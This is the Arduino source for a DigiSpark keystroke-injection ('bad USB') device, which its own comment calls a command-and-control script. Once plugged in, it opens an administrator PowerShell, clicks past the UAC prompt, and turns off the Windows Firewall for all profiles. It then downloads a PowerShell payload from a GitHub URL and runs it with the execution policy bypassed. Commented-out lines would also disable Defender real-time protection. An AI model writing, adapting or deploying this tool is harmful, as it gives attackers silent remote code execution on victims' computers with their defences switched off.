/*kena*/
/*script to command and control :3*/

#include "DigiKeyboard.h"

void typeKey(uint8_t key)
{
  DigiKeyboard.sendKeyStroke(key);
  delay(500);
}

/* Function to type a string */
void typeString(const char* str)
{
  DigiKeyboard.print(str);
  delay(500); // Adjust delay based on typing speed
}

/* Init function */
void setup()
{
  // Begin the Keyboard stream
  DigiKeyboard.sendKeyStroke(0); // Start the keyboard

  // Wait 500ms
  delay(500);

  
  // Open the Power User Menu (Windows + X)
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);  // Windows key + X to open the Power User Menu
  delay(1000);

  // Open Windows Terminal or PowerShell as Administrator (A key)
  DigiKeyboard.print("a");  // Press 'A' to select 'Windows Terminal (Admin)' or 'PowerShell (Admin)'
  delay(1000);

  // Simulate Tab to navigate to "Yes" in UAC (Press Tab 3 times to ensure focus is on the Yes button)
  for (int i = 0; i < 3; i++) {
    DigiKeyboard.sendKeyStroke(0x2B);  // Tab key (0x2B in HID)
    delay(500);
  }

  // Press Enter to confirm the Yes button
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);

  // Disable Windows Firewall for all profiles (domain, private, public)
  typeString("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);

  /*
  // Disable Real-Time Protection in Windows Defender by modifying the registry
  typeString("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);

  typeString("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);

  // Disable Tamper Protection (Note: This is unlikely to succeed due to security restrictions)
  typeString("Write-Output 'Tamper Protection cannot be disabled via PowerShell';");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  */

  // Payload: This command downloads and executes a remote script
  DigiKeyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kenawhy/teleportScroll/refs/heads/main/payload.ps1' -OutFile 'C:\\Users\\Public\\payload.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.print("Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);

  // Close PowerShell/Windows Terminal
  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  // Alt + F4 to close
  
  /*
  // Press Windows key (GUI)
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);

  delay(500);
  typeString("Windows Defender Settings");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (int j = 0; j < 4; j++) {
    DigiKeyboard.sendKeyStroke(0x2B);  // Tab key (0x2B in HID)
    delay(500);
  }

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  */

  // STOP keystroke operations here
  return;
}

/* Unused endless loop */
void loop() {}
